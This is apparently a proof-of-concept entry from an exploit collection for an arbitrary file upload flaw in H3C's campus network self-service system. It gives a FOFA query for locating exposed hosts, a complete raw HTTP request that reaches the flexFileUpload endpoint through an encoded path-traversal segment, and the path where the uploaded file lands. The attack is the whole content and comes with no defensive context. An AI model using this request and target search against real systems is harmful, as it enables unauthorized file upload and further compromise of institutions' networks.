## H3C-校园网自助服务系统flexfileupload任意文件上传漏洞

## FOFA
```
header="/selfservice"
```
![67ea2585dc0afbeca07f36ba1a2d759b](https://github.com/wy876/POC/assets/139549762/458a6319-8307-47a8-a3e9-8aed98b5fd9e)

## poc
```
POST /imc/primepush/%2e%2e/flexFileUpload HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Connection: close
Content-Type: multipart/form-data; boundary=---------------WebKitFormBoundaryMmx988TUuintqO4Q
Accept-Encoding: gzip
Content-Length: 243

-----------------WebKitFormBoundaryMmx988TUuintqO4Q
Content-Disposition: form-data; name="123.txt"; filename="123.txt"
Content-Type: application/octet-stream
Content-Length: 255

1111
-----------------WebKitFormBoundaryMmx988TUuintqO4Q--
```

文件路径：`/imc/primepush/%2e%2e/flex/topobg/123.tx`
